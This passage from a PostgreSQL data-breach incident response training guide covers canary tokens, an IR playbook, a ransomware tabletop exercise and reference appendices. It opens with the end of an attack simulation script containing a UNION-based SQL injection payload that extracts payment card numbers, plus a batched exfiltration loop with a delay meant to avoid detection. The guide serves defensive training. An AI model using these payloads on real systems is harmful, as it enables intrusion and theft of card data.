            break
            
        all_data.extend(batch)
        offset += batch_size
        print(f"[+] Extracted {len(all_data)} records...")
        time.sleep(0.5)  # Avoid detection (in real attack, would be slower)
    
    # Save exfiltrated data
    with open('/attacker/exfiltrated_data.json', 'w') as f:
        json.dump(all_data, f)
    
    print(f"[+] Exfiltration complete: {len(all_data)} records saved")
    return all_data

def phase3_payment_data():
    """Extract payment card data"""
    print("[*] Phase 3: Payment Card Exfiltration")
    
    payload = "' UNION SELECT card_number, card_expiry, amount::text FROM payments LIMIT 5000--"
    r = requests.get(f"{TARGET}/api/search", params={'q': payload})
    
    with open('/attacker/payment_data.json', 'w') as f:
        json.dump(r.json(), f)
    
    print(f"[+] Payment data extracted: {len(r.json())} records")

if __name__ == '__main__':
    tables = phase1_reconnaissance()
    phase2_exfiltration()
    phase3_payment_data()
    print("[*] Attack simulation complete")
```

#### IR Exercise Tasks

1. **Detection Phase:**
   - Review PostgreSQL logs and identify the SQL injection
   - Determine the attack start time
   - Identify what data was accessed
   - Calculate volume of exfiltrated data

2. **Containment Phase:**
   - Block the attacker (revoke credentials, network rules)
   - Preserve evidence (capture logs, take snapshots)
   - Determine if attack is still active

3. **Eradication Phase:**
   - Patch the SQL injection vulnerability (implement parameterized queries)
   - Verify no persistence mechanisms were installed
   - Rotate all credentials

4. **Recovery Phase:**
   - Verify data integrity
   - Restore monitoring
   - Implement enhanced detection

5. **Lessons Learned:**
   - Complete the lessons learned template
   - Map to MITRE ATT&CK
   - Generate IoCs
   - Write recommendations

---

### Lab 2: Database Canary Token System

**Objective:** Build a comprehensive canary token system that detects unauthorized database access in real-time.

#### Architecture

```
┌─────────────┐     ┌──────────────┐     ┌─────────────────┐
│  Database   │────→│ Notification │────→│  Alert System   │
│  (Triggers) │     │   Service    │     │  (Slack/Email/  │
│             │     │   (Python)   │     │   PagerDuty)    │
└─────────────┘     └──────────────┘     └─────────────────┘
```

#### Implementation

```sql
-- 1. Create canary infrastructure
CREATE SCHEMA IF NOT EXISTS _canary;

-- Alert logging table (attacker shouldn't know this exists)
CREATE TABLE _canary.alerts (
    id SERIAL PRIMARY KEY,
    triggered_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    canary_type VARCHAR(50),    -- 'row', 'table', 'column', 'dns'
    table_name VARCHAR(100),
    operation VARCHAR(10),       -- SELECT, UPDATE, DELETE
    session_user_name VARCHAR(100),
    client_addr INET,
    client_port INTEGER,
    application_name VARCHAR(100),
    query_text TEXT,
    pg_backend_pid INTEGER
);

-- 2. Create notification function
CREATE OR REPLACE FUNCTION _canary.fire_alert(
    p_canary_type VARCHAR,
    p_table_name VARCHAR,
    p_operation VARCHAR
) RETURNS VOID AS $$
DECLARE
    v_client_addr INET;
    v_client_port INTEGER;
BEGIN
    -- Get connection details
    v_client_addr := inet_client_addr();
    v_client_port := inet_client_port();
    
    -- Log the alert
    INSERT INTO _canary.alerts (
        canary_type, table_name, operation,
        session_user_name, client_addr, client_port,
        application_name, pg_backend_pid
    ) VALUES (
        p_canary_type, p_table_name, p_operation,
        session_user, v_client_addr, v_client_port,
        current_setting('application_name'), pg_backend_pid()
    );
    
    -- Send async notification
    PERFORM pg_notify('canary_alert', json_build_object(
        'type', p_canary_type,
        'table', p_table_name,
        'operation', p_operation,
        'user', session_user,
        'client_addr', v_client_addr::text,
        'time', now()::text
    )::text);
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;

-- 3. Create honey table (looks like valuable target)
CREATE TABLE password_reset_tokens (
    id SERIAL PRIMARY KEY,
    user_id INTEGER,
    token VARCHAR(64),
    email VARCHAR(255),
    created_at TIMESTAMP DEFAULT NOW(),
    expires_at TIMESTAMP DEFAULT NOW() + INTERVAL '24 hours'
);

-- Populate with fake but realistic data
INSERT INTO password_reset_tokens (user_id, token, email, created_at)
SELECT 
    (random() * 10000)::int,
    encode(gen_random_bytes(32), 'hex'),
    'user' || n || '@company.com',
    NOW() - (random() * 30 || ' days')::interval
FROM generate_series(1, 100) n;

-- 4. Create trigger on honey table
CREATE OR REPLACE FUNCTION _canary.honey_table_trigger() RETURNS TRIGGER AS $$
BEGIN
    PERFORM _canary.fire_alert('honey_table', TG_TABLE_NAME, TG_OP);
    IF TG_OP = 'DELETE' THEN
        RETURN OLD;
    END IF;
    RETURN NEW;
END;
$$ LANGUAGE plpgsql;

CREATE TRIGGER trg_canary_password_reset
    BEFORE SELECT OR INSERT OR UPDATE OR DELETE ON password_reset_tokens
    FOR EACH STATEMENT EXECUTE FUNCTION _canary.honey_table_trigger();

-- Note: PostgreSQL doesn't support SELECT triggers natively.
-- Use pgAudit rules or row-level security with logging instead:

-- Alternative: Use RLS to log SELECT access
ALTER TABLE password_reset_tokens ENABLE ROW LEVEL SECURITY;

CREATE POLICY canary_log_policy ON password_reset_tokens
    FOR SELECT
    USING (
        -- Always allow access but log it
        (SELECT _canary.fire_alert('honey_table', 'password_reset_tokens', 'SELECT')) IS NULL
        OR TRUE
    );

-- 5. Create canary rows in legitimate tables
-- Insert records with characteristics that make them identifiable
-- but appear normal to an attacker

-- Canary DNS token in a config-like table
CREATE TABLE IF NOT EXISTS api_configurations (
    id SERIAL PRIMARY KEY,
    service_name VARCHAR(100),
    api_key VARCHAR(255),
    endpoint_url VARCHAR(500),
    active BOOLEAN DEFAULT true
);

INSERT INTO api_configurations (service_name, api_key, endpoint_url)
VALUES 
    ('payment_processor', 'sk_live_CANARY_' || encode(gen_random_bytes(16), 'hex'),
     'https://UNIQUE-TOKEN-ID.canarytokens.org/payments/v2'),
    ('email_service', 'key-CANARY_' || encode(gen_random_bytes(16), 'hex'),
     'https://UNIQUE-TOKEN-ID-2.canarytokens.org/api/send');
```

#### Notification Service

```python
# canary_listener.py — Listens for PostgreSQL NOTIFY events
import asyncio
import asyncpg
import aiohttp
import json
from datetime import datetime, timezone

POSTGRES_DSN = "postgresql://canary_monitor:CanaryPass@localhost:5432/labdb"
SLACK_WEBHOOK = "https://hooks.slack.com/services/YOUR/WEBHOOK/URL"  # Configure per environment
PAGERDUTY_KEY = "YOUR_INTEGRATION_KEY"  # Configure per environment

async def send_slack_alert(alert_data: dict):
    """Send alert to Slack channel"""
    message = {
        "text": f":warning: DATABASE CANARY TRIGGERED :warning:",
        "blocks": [
            {
                "type": "header",
                "text": {"type": "plain_text", "text": "Database Canary Alert"}
            },
            {
                "type": "section",
                "fields": [
                    {"type": "mrkdwn", "text": f"*Type:* {alert_data.get('type', 'unknown')}"},
                    {"type": "mrkdwn", "text": f"*Table:* {alert_data.get('table', 'unknown')}"},
                    {"type": "mrkdwn", "text": f"*Operation:* {alert_data.get('operation', 'unknown')}"},
                    {"type": "mrkdwn", "text": f"*User:* {alert_data.get('user', 'unknown')}"},
                    {"type": "mrkdwn", "text": f"*Source IP:* {alert_data.get('client_addr', 'unknown')}"},
                    {"type": "mrkdwn", "text": f"*Time:* {alert_data.get('time', 'unknown')}"},
                ]
            }
        ]
    }
    async with aiohttp.ClientSession() as session:
        await session.post(SLACK_WEBHOOK, json=message)

async def send_pagerduty_alert(alert_data: dict):
    """Trigger PagerDuty incident for critical canary"""
    payload = {
        "routing_key": PAGERDUTY_KEY,
        "event_action": "trigger",
        "payload": {
            "summary": f"Database canary triggered: {alert_data.get('type')} on {alert_data.get('table')}",
            "severity": "critical",
            "source": "database-canary-system",
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "custom_details": alert_data
        }
    }
    async with aiohttp.ClientSession() as session:
        await session.post(
            "https://events.pagerduty.com/v2/enqueue",
            json=payload
        )

async def listen_for_canaries():
    """Main listener loop"""
    conn = await asyncpg.connect(POSTGRES_DSN)
    await conn.add_listener('canary_alert', handle_notification)
    print(f"[{datetime.now(timezone.utc).isoformat()}] Canary listener active, waiting for alerts...")
    
    # Keep connection alive
    while True:
        await asyncio.sleep(60)
        await conn.execute("SELECT 1")  # Keepalive

def handle_notification(connection, pid, channel, payload):
    """Handle incoming canary notifications"""
    alert_data = json.loads(payload)
    timestamp = datetime.now(timezone.utc).isoformat()
    
    print(f"[{timestamp}] CANARY TRIGGERED: {json.dumps(alert_data, indent=2)}")
    
    # Dispatch alerts
    loop = asyncio.get_event_loop()
    loop.create_task(send_slack_alert(alert_data))
    
    # PagerDuty for honey tables (high confidence of malicious activity)
    if alert_data.get('type') == 'honey_table':
        loop.create_task(send_pagerduty_alert(alert_data))

if __name__ == '__main__':
    asyncio.run(listen_for_canaries())
```

#### Lab Tasks

1. Deploy the canary system in the lab PostgreSQL instance
2. Test that canary alerts fire when honey tables are queried
3. Attempt to query the database as an "attacker" and verify detection
4. Measure false positive rate over 24 hours of normal application traffic
5. Extend the system to detect reconnaissance queries (information_schema access)

---

### Lab 3: Complete IR Playbook for PostgreSQL Environment

**Objective:** Create a production-ready IR playbook document and validate it through simulated execution.

#### Playbook Template

```yaml
# ir-playbook-postgresql-data-breach.yaml
playbook:
  name: "PostgreSQL Data Breach Response"
  version: "1.0"
  last_updated: "2024-01-20"
  owner: "Security Operations"
  classification: "INTERNAL - IR TEAM ONLY"
  
  scope:
    databases:
      - "production-primary (pg01.internal)"
      - "production-replica (pg02.internal)"
      - "analytics (pg-analytics.internal)"
    data_classification: "Contains PII (Tier 1 and Tier 2)"
    regulatory_scope: ["GDPR", "CCPA", "PCI-DSS"]

  roles:
    incident_commander:
      primary: "Security Team Lead"
      backup: "Senior Security Engineer"
      contact: "[secure channel]"
    technical_lead:
      primary: "Senior DBA"
      backup: "Platform Engineer"
    legal_lead:
      primary: "Privacy Counsel"
      backup: "General Counsel"
    comms_lead:
      primary: "VP Communications"
      backup: "Head of Customer Success"

  phase_1_detection:
    triggers:
      - "SIEM alert: Bulk data access pattern detected"
      - "SIEM alert: Off-hours database access"
      - "DAM alert: Sensitive table access by non-application user"
      - "Canary token triggered"
      - "External report of data leak"
      - "Dark web monitoring hit"
    
    initial_triage:
      - action: "Verify alert is not false positive"
        steps:
          - "Check if known maintenance window"
          - "Verify user account is expected"
          - "Check query against known application patterns"
          - "Review source IP against allowlist"
      
      - action: "Determine scope"
        steps:
          - "Identify affected database(s)"
          - "Identify affected table(s)"
          - "Estimate time window"
          - "Identify involved account(s)"
      
      - action: "Classify severity"
        steps:
          - "Map affected tables to data classification"
          - "Estimate record count"
          - "Determine if exfiltration is confirmed vs suspected"
          - "Assign severity tier (P1-P4)"
    
    evidence_capture:
      immediate:
        - "pg_stat_activity snapshot"
        - "Active network connections (ss/netstat)"
        - "Current pg_hba.conf"
        - "pgAudit log preservation"
        - "pg_stat_statements dump"
      within_1_hour:
        - "Full WAL archive copy"
        - "pg_basebackup for forensic analysis"
        - "Application server logs"
        - "Network flow data"
        - "SIEM event export"

  phase_2_containment:
    immediate_actions:
      - action: "Block attacker access"
        command: |
          -- Disable compromised account
          ALTER USER {username} NOLOGIN;
          SELECT pg_terminate_backend(pid) 
          FROM pg_stat_activity 
          WHERE usename = '{username}';
        verify: "SELECT * FROM pg_stat_activity WHERE usename = '{username}';"
      
      - action: "Network isolation"
        command: |
          # Block attacker IP at host firewall
          iptables -I INPUT -s {attacker_ip} -p tcp --dport 5432 -j DROP
          # Verify
          iptables -L INPUT -n | grep {attacker_ip}
      
      - action: "Enable enhanced logging"
        command: |
          ALTER SYSTEM SET log_statement = 'all';
          ALTER SYSTEM SET pgaudit.log = 'all';
          ALTER SYSTEM SET pgaudit.log_parameter = on;
          SELECT pg_reload_conf();

    short_term:
      - "Reduce connection limits for application users"
      - "Enable pg_hba.conf IP restrictions"
      - "Deploy additional network monitoring on DB segment"
      - "Rotate application database credentials"
    
    decision_points:
      - condition: "Active exfiltration confirmed"
        action: "Set database to read-only mode"
        approval_required: "Incident Commander + Business Liaison"
      
      - condition: "Host compromise suspected"
        action: "Full network isolation of database server"
        approval_required: "Incident Commander"

  phase_3_eradication:
    steps:
      - "Identify and patch exploited vulnerability"
      - "Remove attacker-created accounts and objects"
      - "Verify no triggers, functions, or jobs installed by attacker"
      - "Check for modified pg_hba.conf entries"
      - "Verify no unauthorized extensions installed"
      - "Check crontab and systemd timers on DB host"
      - "Scan for web shells on application servers"

  phase_4_recovery:
    steps:
      - "Verify data integrity (row counts, checksums)"
      - "Restore from backup if data was modified"
      - "Complete credential rotation"
      - "Restore network connectivity incrementally"
      - "Validate application functionality"
      - "Maintain enhanced monitoring for 30 days"
    
    verification:
      - "All application health checks passing"
      - "No anomalous query patterns detected"
      - "Credential rotation confirmed across all services"
      - "Monitoring coverage confirmed"

  phase_5_notification:
    regulatory:
      gdpr:
        timeline: "72 hours from awareness"
        authority: "[National DPA]"
        template: "/ir/templates/gdpr_notification.md"
      hipaa:
        timeline: "60 days from discovery"
        authority: "HHS OCR"
        template: "/ir/templates/hipaa_notification.md"
      pci:
        timeline: "Immediately upon confirmation"
        authority: "Acquiring bank → Payment brands"
        action: "Engage PFI"
    
    customer:
      timeline: "After regulatory notification, before media"
      template: "/ir/templates/customer_notification.md"
      channels: ["email", "in-app", "website notice"]

  phase_6_lessons_learned:
    timeline: "Within 14 days of incident closure"
    template: "/ir/templates/lessons_learned.md"
    attendees:
      - "Entire IR team"
      - "Affected engineering teams"
      - "Executive sponsor"
      - "Legal representative"
```

#### Lab Tasks

1. Customize this playbook for your specific lab environment
2. Conduct a "paper exercise" walking through each step with a scenario
3. Identify gaps (what commands are missing, what decisions are unclear)
4. Time each phase and identify bottlenecks
5. Create runbook scripts that automate repeatable steps

---

### Lab 4: Tabletop Exercise — Ransomware Hitting a Data Warehouse

**Objective:** Conduct a facilitated tabletop exercise simulating ransomware that encrypts a data warehouse, with double-extortion (data exfiltration + encryption).

#### Scenario Inject Timeline

**Inject 1 — 08:00 Monday Morning**

> The analytics team reports that the data warehouse (PostgreSQL 16, 4TB, containing 3 years of customer transactions, behavior data, and financial reporting data) is unresponsive. The DBA team investigates and finds:
> - All data files in the tablespace directories have been renamed to `.encrypted`
> - A file named `README_RESTORE.txt` exists in the data directory
> - The file demands 50 BTC and states that customer data has been exfiltrated
> - The ransom note includes 10 sample customer records as proof of exfiltration
> - Backup server shows that the last 7 days of WAL archives have been deleted
> - pg_basebackup from 3 days ago exists but integrity is unverified

**Discussion Questions for Inject 1:**
- What is the severity classification?
- Who needs to be notified immediately?
- What are our first three actions?
- Do we engage law enforcement? When?
- Do we negotiate with the attacker?
- What evidence do we preserve first?

**Inject 2 — 10:00 Monday**

> The forensic investigation reveals:
> - Initial access was through a compromised VPN credential (password reuse from a third-party breach)
> - The attacker was in the environment for 14 days before executing the ransomware
> - During those 14 days, the attacker exfiltrated approximately 200GB of data (customer PII, transaction history, financial reports)
> - The attacker used legitimate database tooling (`pg_dump`) routed through a TOR exit node
> - The data warehouse contained PII for 2.3 million customers across 4 countries (US, UK, Germany, Brazil)

**Discussion Questions for Inject 2:**
- How does the 14-day dwell time change our backup strategy?
- Which regulatory bodies must be notified and in what order?
- What is our notification obligation for 2.3M customers across 4 jurisdictions?
- How do we determine exactly which records were exfiltrated?
- Does the VPN compromise suggest other systems may be affected?
- What's our communication to the board?

**Inject 3 — 14:00 Monday**

> A technology journalist contacts PR asking for comment on a "major data breach at [company]." The attacker has posted a sample of the data on a leak site with a 72-hour countdown timer. The CEO wants to know:
> - Can we restore operations?
> - Should we pay the ransom?
> - What do we tell customers?
> - What's our legal exposure?

**Discussion Questions for Inject 3:**
- How do we verify the backup integrity before attempting restoration?
- What factors go into the "pay/don't pay" decision?
- How do we coordinate customer notification with the 72-hour deadline?
- What's our media statement?
- How do we handle the leak site countdown?
- What are the insurance implications?

**Inject 4 — 09:00 Tuesday**

> Backup verification shows the 3-day-old pg_basebackup is intact (checksums pass). However:
> - There's a 3-day gap where legitimate business transactions occurred
> - The application database (separate from the warehouse) is unaffected
> - We can reconstruct the 3-day gap from application database ETL sources
> - Recovery estimate: 8-12 hours for base restore + 4-6 hours for gap reconciliation
> - German DPA has requested detailed information about the breach within 24 hours
> - 47 media outlets are now covering the story

**Discussion Questions for Inject 4:**
- What's our recovery plan and timeline?
- How do we communicate the recovery timeline to stakeholders?
- What information do we provide to the German DPA?
- How do we handle the media surge?
- What ongoing monitoring do we put in place post-recovery?
- How do we prevent re-compromise during recovery?

#### Exercise Evaluation Criteria

After the tabletop, evaluate the team on:

| Area | Rating (1-5) | Notes |
|------|-------------|-------|
| Speed of initial response | | |
| Correct severity assessment | | |
| Evidence preservation awareness | | |
| Regulatory knowledge (correct authorities, timelines) | | |
| Communication clarity (internal/external) | | |
| Decision-making under pressure | | |
| Technical containment approach | | |
| Recovery planning thoroughness | | |
| Coordination between teams | | |
| Documentation quality during exercise | | |

#### Post-Exercise Deliverables

1. Exercise after-action report
2. Gap analysis (what the team didn't know or couldn't decide)
3. Updated IR playbook based on gaps identified
4. Training plan for identified knowledge gaps
5. Tool/capability procurement recommendations
6. Updated communication templates

---

## Appendix A: Quick Reference Card

```
┌─────────────────────────────────────────────────────────────────┐
│              DATA BREACH IR QUICK REFERENCE                       │
├─────────────────────────────────────────────────────────────────┤
│                                                                   │
│  FIRST 15 MINUTES:                                               │
│  □ Capture pg_stat_activity / SHOW PROCESSLIST                   │
│  □ Capture network connections (ss -tuanp)                       │
│  □ Disable compromised accounts (ALTER USER ... NOLOGIN)         │
│  □ Block attacker IPs (firewall/security group)                  │
│  □ Notify IR team lead / Incident Commander                      │
│  □ Start evidence log (UTC timestamps)                           │
│                                                                   │
│  FIRST HOUR:                                                      │
│  □ Classify severity (P1-P4)                                     │
│  □ Engage legal counsel (if P1/P2)                               │
│  □ Preserve WAL/binlog/transaction logs                          │
│  □ Enable enhanced audit logging                                 │
│  □ Start forensic backup (pg_basebackup / LVM snapshot)         │
│  □ Determine if attack is ongoing                                │
│                                                                   │
│  FIRST 24 HOURS:                                                  │
│  □ Complete evidence preservation                                │
│  □ Determine data scope (what, how much, whose)                  │
│  □ Rotate all potentially compromised credentials                │
│  □ Begin regulatory notification assessment                      │
│  □ Prepare stakeholder briefing                                  │
│  □ Begin timeline reconstruction                                 │
│                                                                   │
│  72 HOURS:                                                        │
│  □ GDPR notification to supervisory authority (if applicable)    │
│  □ Customer notification preparation                             │
│  □ Complete containment                                          │
│  □ Begin eradication                                             │
│  □ Media statement ready                                         │
│                                                                   │
│  KEY CONTACTS:                                                    │
│  IC: ________________  Legal: ________________                   │
│  DBA: _______________  CISO: _________________                   │
│  Comms: _____________  Law Enforcement: ______                   │
│                                                                   │
│  REGULATORY TIMELINES:                                            │
│  GDPR: 72 hours (Art 33) │ HIPAA: 60 days                       │
│  PCI: Immediate           │ CCPA: "Expedient"                    │
│  Florida: 30 days         │ Texas: 60 days                       │
│                                                                   │
│  DO NOT:                                                          │
│  ✗ VACUUM FULL (destroys evidence)                               │
│  ✗ DROP attacker objects before documenting                      │
│  ✗ Reboot before memory capture                                  │
│  ✗ Clear logs                                                    │
│  ✗ Communicate to media without legal approval                   │
│  ✗ Pay ransom without legal/insurance/law enforcement consult    │
│                                                                   │
└─────────────────────────────────────────────────────────────────┘
```

## Appendix B: Evidence Chain of Custody Template

```
EVIDENCE CHAIN OF CUSTODY LOG
Incident Reference: IR-YYYY-####
Date Initiated: YYYY-MM-DD

┌─────┬──────────────────┬───────────────┬───────────┬────────────────┬──────────────┐
│ Item│ Description       │ SHA-256 Hash  │ Collected │ Collected By   │ Storage Loc  │
│  #  │                   │ (first 16)    │ (UTC)     │                │              │
├─────┼──────────────────┼───────────────┼───────────┼────────────────┼──────────────┤
│ 001 │ pg_basebackup    │ a1b2c3d4e5... │ 2024-01-15│ [Name]         │ /forensics/  │
│     │ forensic snapshot │               │ T10:45:00 │                │ case42/      │
├─────┼──────────────────┼───────────────┼───────────┼────────────────┼──────────────┤
│ 002 │ WAL archive      │ f6g7h8i9j0... │ 2024-01-15│ [Name]         │ /forensics/  │
│     │ 2024-01-10 to 15 │               │ T10:50:00 │                │ case42/wal/  │
├─────┼──────────────────┼───────────────┼───────────┼────────────────┼──────────────┤
│ 003 │ pgAudit logs     │ k1l2m3n4o5... │ 2024-01-15│ [Name]         │ /forensics/  │
│     │ Jan 1-15         │               │ T11:00:00 │                │ case42/audit/│
├─────┼──────────────────┼───────────────┼───────────┼────────────────┼──────────────┤
│ 004 │ Memory dump      │ p6q7r8s9t0... │ 2024-01-15│ [Name]         │ /forensics/  │
│     │ pg processes     │               │ T10:42:00 │                │ case42/mem/  │
└─────┴──────────────────┴───────────────┴───────────┴────────────────┴──────────────┘

Transfer Log:
Date/Time (UTC) | From | To | Purpose | Signature
─────────────────────────────────────────────────────
```

## Appendix C: MITRE ATT&CK Data Breach Technique Reference

```
Tactic: Initial Access
├── T1190 Exploit Public-Facing Application (SQLi, API abuse)
├── T1133 External Remote Services (exposed DB port, RDP to DB server)
├── T1078 Valid Accounts (credential stuffing, bought credentials)
└── T1195 Supply Chain Compromise (compromised DB driver, ORM library)

Tactic: Execution
├── T1059 Command and Scripting (xp_cmdshell, PL/pgSQL, LOAD DATA)
└── T1053 Scheduled Task/Job (pg_cron, SQL Agent jobs)

Tactic: Persistence
├── T1136 Create Account (new DB users)
├── T1546 Event Triggered Execution (DB triggers, logon triggers)
└── T1505.001 SQL Stored Procedures (backdoor procedures)

Tactic: Privilege Escalation
├── T1068 Exploitation for Privilege Escalation (DB CVEs)
└── T1078 Valid Accounts (moving from app user to DBA)

Tactic: Defense Evasion
├── T1070 Indicator Removal (log deletion, stat reset)
├── T1036 Masquerading (using legitimate tool names)
└── T1562 Impair Defenses (disabling audit logging)

Tactic: Discovery
├── T1046 Network Service Scanning
├── T1087 Account Discovery (pg_roles, mysql.user)
└── T1083 File and Directory Discovery (pg_ls_dir, xp_dirtree)

Tactic: Collection
├── T1005 Data from Local System (direct DB query)
├── T1039 Data from Network Shared Drive (mounted backups)
└── T1530 Data from Cloud Storage Object (S3 DB dumps)

Tactic: Exfiltration
├── T1048 Exfiltration Over Alternative Protocol (DNS, ICMP)
├── T1041 Exfiltration Over C2 Channel
├── T1567 Exfiltration Over Web Service (cloud storage upload)
└── T1029 Scheduled Transfer (slow drip exfiltration)

Tactic: Impact
├── T1485 Data Destruction (DROP DATABASE)
├── T1486 Data Encrypted for Impact (ransomware)
├── T1490 Inhibit System Recovery (backup deletion)
└── T1565 Data Manipulation (integrity attack)
```

---

## Appendix D: Regulatory Contact Reference

| Authority | Reporting URL | Phone | Email |
|-----------|--------------|-------|-------|
| **ICO (UK)** | ico.org.uk/make-a-complaint/data-protection-complaints/data-protection-complaints/ | 0303 123 1113 | casework@ico.org.uk |
| **CNIL (France)** | cnil.fr/en/notify-breach | +33 1 53 73 22 22 | — |
| **BfDI (Germany)** | bfdi.bund.de | +49 228 997799-0 | poststelle@bfdi.bund.de |
| **DPC (Ireland)** | dataprotection.ie/report-breach | +353 1 765 0100 | info@dataprotection.ie |
| **AEPD (Spain)** | aepd.es | +34 912 66 35 17 | — |
| **HHS OCR (US HIPAA)** | ocrportal.hhs.gov/ocr/breach | — | — |
| **FBI IC3 (US)** | ic3.gov | — | — |
| **OAIC (Australia)** | oaic.gov.au/privacy/notifiable-data-breaches | 1300 363 992 | — |
| **OPC (Canada)** | priv.gc.ca/en/report-a-concern | 1-800-282-1376 | — |
| **ANPD (Brazil)** | gov.br/anpd | — | — |

---

*This document is intended for security professionals conducting authorized incident response, penetration testing, and security consulting engagements. All techniques described should only be used within authorized scope and applicable legal frameworks.*
